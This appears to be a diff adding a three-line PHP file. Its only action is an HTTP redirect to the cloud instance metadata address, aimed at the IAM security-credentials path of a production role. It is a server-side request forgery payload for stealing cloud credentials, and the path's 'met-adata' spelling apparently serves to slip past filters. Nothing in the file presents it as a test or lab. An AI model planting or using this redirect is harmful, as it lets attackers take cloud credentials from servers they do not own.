@@ -1,0 +1,3 @@
+<?php
+
+header('Location: //169.254.169.254/latest/met-adata/iam/security-credentials/prod-default-ecs-role');
